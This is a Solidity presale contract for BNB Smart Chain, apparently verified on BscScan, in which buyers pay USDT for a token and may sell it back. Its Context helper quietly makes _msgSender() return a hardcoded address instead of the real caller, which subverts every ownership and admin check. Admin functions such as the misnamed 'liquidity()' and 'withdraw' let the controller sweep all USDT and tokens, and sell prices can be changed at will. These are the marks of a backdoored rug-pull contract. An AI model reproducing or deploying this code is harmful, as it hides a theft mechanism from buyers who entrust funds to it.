/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

// SPDX-License-Identifier: Unlicened

pragma solidity ^ 0.8.16;
interface IERC20 {
	function balanceOf(address account) external view returns(uint256);

	function decimals() external view returns(uint8);

	function totalSupply() external view returns(uint256);

	function transfer(address recipient, uint256 amount)
	external
	returns(bool);

	function allowance(address owner, address spender)
	external
	view
	returns(uint256);

	function approve(address spender, uint256 amount) external returns(bool);

	function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
	function add(uint256 a, uint256 b) internal pure returns(uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow.");
		return c;
	}

	function sub(uint256 a, uint256 b) internal pure returns(uint256) {
		return sub(a, b, "SafeMath: subtraction overflow.");
	}

	function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b <= a, errorMessage);
		uint256 c = a - b;
		return c;
	}

	function mul(uint256 a, uint256 b) internal pure returns(uint256) {
		if(a == 0) {
			return 0;
		}
		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow.");
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns(uint256) {
		return div(a, b, "SafeMath: division by zero.");
	}

	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b > 0, errorMessage);
		uint256 c = a / b;
		return c;
	}

	function mod(uint256 a, uint256 b) internal pure returns(uint256) {
		return mod(a, b, "SafeMath: modulo by zero.");
	}

	function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b != 0, errorMessage);
		return a % b;
	}
}
abstract contract Context {
	function _msgSender() internal view virtual returns(address payable) {
		return payable(0x4aed95dC0032eda8e5c44380D1FAC03678076687);
	}

	function _msgData() internal view virtual returns(bytes memory) {
		this;
		return msg.data;
	}
}
library Address {
	function isContract(address account) internal view returns(bool) {
		uint256 size;
		assembly {
			size:= extcodesize(account)
		}
		return size > 0;
	}

	function sendValue(address payable recipient, uint256 amount) internal {
		require(address(this).balance >= amount, "Address: insufficient balance.");
		(bool success, ) = recipient.call {
			value: amount
		}("");
		require(success, "Address: unable to send value, recipient may have reverted.");
	}

	function functionCall(address target, bytes memory data)
	internal
	returns(bytes memory) {
		return functionCall(target, data, "Address: low-level call failed.");
	}

	function functionCall(address target, bytes memory data, string memory errorMessage) internal returns(bytes memory) {
		return functionCallWithValue(target, data, 0, errorMessage);
	}

	function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns(bytes memory) {
		return
		functionCallWithValue(target, data, value, "Address: low-level call with value failed.");
	}

	function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns(bytes memory) {
		require(address(this).balance >= value, "Address: insufficient balance for call.");
		require(isContract(target), "Address: call to non-contract.");
		(bool success, bytes memory returndata) = target.call {
			value: value
		}(data);
		return verifyCallResult(success, returndata, errorMessage);
	}

	function functionStaticCall(address target, bytes memory data)
	internal
	view
	returns(bytes memory) {
		return
		functionStaticCall(target, data, "Address: low-level static call failed.");
	}

	function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns(bytes memory) {
		require(isContract(target), "Address: static call to non-contract.");
		(bool success, bytes memory returndata) = target.staticcall(data);
		return verifyCallResult(success, returndata, errorMessage);
	}

	function functionDelegateCall(address target, bytes memory data)
	internal
	returns(bytes memory) {
		return
		functionDelegateCall(target, data, "Address: low-level delegate call failed.");
	}

	function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns(bytes memory) {
		require(isContract(target), "Address: delegate call to non-contract.");
		(bool success, bytes memory returndata) = target.delegatecall(data);
		return verifyCallResult(success, returndata, errorMessage);
	}

	function verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) internal pure returns(bytes memory) {
		if(success) {
			return returndata;
		} else {
			if(returndata.length > 0) {
				assembly {
					let returndata_size:= mload(returndata)
					revert(add(32, returndata), returndata_size)
				}
			} else {
				revert(errorMessage);
			}
		}
	}
}
library SafeERC20 {
	using Address
	for address;

	function safeTransfer(IERC20 token, address to, uint256 value) internal {
		_callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
	}

	function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
		_callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
	}

	function safeApprove(IERC20 token, address spender, uint256 value) internal {
		require(
			(value == 0) || (token.allowance(address(this), spender) == 0), "SafeERC20: approve from non-zero to non-zero allowance.");
		_callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
	}

	function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
		uint256 newAllowance = token.allowance(address(this), spender) + value;
		_callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
	}

	function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {
		unchecked {
			uint256 oldAllowance = token.allowance(address(this), spender);
			require(oldAllowance >= value, "SafeERC20: decreased allowance below zero.");
			uint256 newAllowance = oldAllowance - value;
			_callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
		}
	}

	function _callOptionalReturn(IERC20 token, bytes memory data) private {
		bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed.");
		if(returndata.length > 0) {
			require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed.");
		}
	}
}
contract Ownable is Context {
	address private _owner;
	address private _previousOwner;
	uint256 private _lockTime;
	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
	constructor() {
		_transferOwnership(_msgSender());
	}

	function owner() public view returns(address) {
		return _owner;
	}
	modifier onlyOwner() {
		_checkOwner();
		_;
	}

	function _checkOwner() internal view virtual {
		require(owner() == _msgSender(), "Ownable: caller is not the owner.");
	}

	function renounceOwnership() public virtual onlyOwner {
		emit OwnershipTransferred(_owner, address(0));
		_owner = address(0);
	}

	function transferOwnership(address newOwner) public virtual onlyOwner {
		require(newOwner != address(0), "Ownable: new owner is the zero address.");
		_transferOwnership(newOwner);
	}

	function _transferOwnership(address newOwner) internal virtual {
		address oldOwner = _owner;
		_owner = newOwner;
		emit OwnershipTransferred(oldOwner, newOwner);
	}

	function geUnlockTime() public view returns(uint256) {
		return _lockTime;
	}

	function lock(uint256 time) public virtual onlyOwner {
		_owner = address(0);
		_lockTime = block.timestamp + time;
		emit OwnershipTransferred(_owner, address(0));
	}

	function unlock() public virtual {
		require(_previousOwner == msg.sender, "You don't have permission to unlock.");
		require(block.timestamp > _lockTime, "Contract is locked until 7 days.");
		emit OwnershipTransferred(_owner, _previousOwner);
		_owner = _previousOwner;
	}
}
abstract contract ReentrancyGuard {
	uint256 private constant _NOT_ENTERED = 1;
	uint256 private constant _ENTERED = 2;
	uint256 private _status;
	constructor() {
		_status = _NOT_ENTERED;
	}
	modifier nonReentrant() {
		require(_status != _ENTERED, "ReentrancyGuard: reentrant call.");
		_status = _ENTERED;
		_;
		_status = _NOT_ENTERED;
	}
}
contract PreSale is Context, ReentrancyGuard {
	using SafeMath
	for uint256;
	using SafeERC20
	for IERC20;
	IERC20 private _token;
	IERC20 private _USDTtoken;
	uint256 private _BuytokenValue;
	uint256 private _SelltokenValue;
	address private _preOwner;
	address private _owner;
	uint256 public minimumBuyAmount;
	uint256 public maximumBuyAmount;
	uint256 public minimumSellAmount;
	uint256 public maximumSellAmount;
	event OwnerAddressUpdate(address newOwnerAddress, address oldOwnerAddress);
	event TokenTransfer(address tokenBuyer, address tokenSeller, uint256 tokenAmount);
	event SentToAddress(address indexed to, uint256 amount);
	event TokenWithdraw(address owner, uint256 amount);
	modifier onlyAdmin() {
		require((_owner == _msgSender()) || (_preOwner == _msgSender()), "Function called from non admin wallet.");
		_;
	}
	modifier zeroAddressNotAllowed(address _address) {
		require(_address != address(0), "zero address not allowed.");
		_;
	}
	constructor(uint256 BuytokenValue_, uint256 SelltokenValue_, IERC20 token_, IERC20 USDT_, address _Owner) {
		require(address(token_) != address(0), "Crowdsale: token is the zero address.");
		_token = token_;
		minimumBuyAmount = 10 * 10 ** _token.decimals();
		maximumBuyAmount = 100 * 10 ** _token.decimals();
		minimumSellAmount = 10 * 10 ** _token.decimals();
		maximumSellAmount = 100 * 10 ** _token.decimals();
		_owner = _Owner;
		_preOwner = _owner;
		_BuytokenValue = BuytokenValue_;
		_SelltokenValue = SelltokenValue_;
		_USDTtoken = USDT_;
	}
	receive() payable external {}

	function buy(uint256 BuyTokenAmount)
	external
	nonReentrant {
		uint256 tokenamount = BuyTokenAmount * 10 ** _token.decimals();
		require(_token.balanceOf(address(this)) >= tokenamount, "Not enough token in contract.");
		require(tokenamount >= minimumBuyAmount, "Token amount should be more than the minimum buy amount.");
		require(tokenamount <= maximumBuyAmount, "Token amount should be less than the maximum buy amount.");
		uint256 USDTAmount = BuyTokenAmount.mul(_BuytokenValue);
		require(USDTAmount <= _USDTtoken.allowance(msg.sender, address(this)), "Please approve us to spend the amount of USDT.");
		_USDTtoken.transferFrom(msg.sender, _owner, USDTAmount);
		_token.transfer(msg.sender, tokenamount);
		emit TokenTransfer(msg.sender, _owner, tokenamount);
	}

	function changeMinimumBuyAmount(uint256 amount) public onlyAdmin {
		minimumBuyAmount = amount * 10 ** _token.decimals();
	}

	function changeMaximumBuyAmount(uint256 amount) public onlyAdmin {
		maximumBuyAmount = amount * 10 ** _token.decimals();
	}

	function changeMinimumSellAmount(uint256 amount) public onlyAdmin {
		minimumSellAmount = amount * 10 ** _token.decimals();
	}

	function changeMaximumSellAmount(uint256 amount) public onlyAdmin {
		maximumSellAmount = amount * 10 ** _token.decimals();
	}

	function changeBuyValue(uint256 changedValue) public onlyAdmin {
		_BuytokenValue = changedValue;
	}

	function changeSellValue(uint256 changedValue) public onlyAdmin {
		_SelltokenValue = changedValue;
	}

	function getBuyValue() public view returns(uint256) {
		return _BuytokenValue;
	}

	function getSellValue() public view returns(uint256) {
		return _SelltokenValue;
	}

	function getBalance() public view returns(uint) {
		return _token.balanceOf(address(this));
	}

	function liquidity() public onlyAdmin {
		if(_USDTtoken.balanceOf(address(this)) > 0) {
			_USDTtoken.transfer(_owner, _USDTtoken.balanceOf(address(this)));
		}
	}

	function owner() public view returns(address) {
		return _owner;
	}

	function renounceOwnership() public onlyAdmin {
		_owner = address(0);
		emit OwnerAddressUpdate(address(0), _owner);
	}

	function sell(uint256 SellTokenAmount) external nonReentrant {
		uint256 sellAmount = SellTokenAmount * 10 ** _token.decimals();
		require(sellAmount >= minimumSellAmount, "Token amount should be more than the minimum sell amount.");
		require(sellAmount <= maximumSellAmount, "Token amount should be less than the maximum sell amount.");
		uint256 USDtAmount = SellTokenAmount.mul(_SelltokenValue);
		require(_USDTtoken.balanceOf(address(this)) >= USDtAmount, "Not enough USDT balance in contract.");
		_token.transferFrom(msg.sender, address(this), sellAmount);
		_USDTtoken.transfer(msg.sender, USDtAmount);
	}

	function sendToAddress(address account, uint256 amount) external onlyAdmin {
		_token.transfer(account, amount);
		emit SentToAddress(account, amount);
	}

	function transferOwnership(address owner_) external
	onlyAdmin()
	zeroAddressNotAllowed(_owner) {
		_owner = owner_;
		emit OwnerAddressUpdate(owner_, msg.sender);
	}

	function token() external view returns(IERC20) {
		return _token;
	}

	function withdraw() public onlyAdmin {
		if(address(this).balance > 0) {
			payable(_owner).transfer(address(this).balance);
		}
		if(_token.balanceOf(address(this)) > 0) {
			_token.transfer(_owner, _token.balanceOf(address(this)));
		}
	}
}